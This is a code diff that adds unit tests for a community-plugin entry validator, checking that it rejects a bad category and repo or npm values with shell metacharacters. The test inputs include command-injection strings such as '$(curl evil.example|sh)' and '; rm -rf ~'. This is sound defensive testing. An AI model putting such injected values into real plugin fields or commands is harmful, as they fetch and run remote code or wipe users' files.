@@ -21,5 +21,17 @@ describe('isCommunityPluginEntry', () => {
     expect(isCommunityPluginEntry({ id: 'x', name: 'X', nameEn: 'X', author: '', repo: 'https://github.com/a/b' })).toBe(false)
     expect(isCommunityPluginEntry({ id: 'x', name: 'X', nameEn: 'X', author: 'a', repo: 'not-a-url' })).toBe(false)
     expect(isCommunityPluginEntry({ id: 'x', name: 'X', nameEn: 'X', author: 'a', repo: 'https://github.com/a/b', npm: 42 })).toBe(false)
+    expect(isCommunityPluginEntry({ id: 'x', name: 'X', nameEn: 'X', author: 'a', repo: 'https://github.com/a/b', category: 42 })).toBe(false)
+    expect(isCommunityPluginEntry({ id: 'x', name: 'X', nameEn: 'X', author: 'a', repo: 'https://github.com/a/b', category: 'bogus' })).toBe(false)
+  })
+
+  it('rejects repo/npm values carrying shell metacharacters', () => {
+    const base = { id: 'x', name: 'X', nameEn: 'X', author: 'a', repo: 'https://github.com/a/b' }
+    expect(isCommunityPluginEntry({ ...base, repo: 'https://github.com/a/b$(curl evil.example|sh)' })).toBe(false)
+    expect(isCommunityPluginEntry({ ...base, repo: 'https://github.com/a/b; rm -rf ~' })).toBe(false)
+    expect(isCommunityPluginEntry({ ...base, repo: 'https://github.com/a/b|sh' })).toBe(false)
+    expect(isCommunityPluginEntry({ ...base, npm: 'foo;curl evil.example' })).toBe(false)
+    expect(isCommunityPluginEntry({ ...base, npm: 'foo bar' })).toBe(false)
+    expect(isCommunityPluginEntry({ ...base, npm: '@scope/pkg' })).toBe(true)
   })
 })
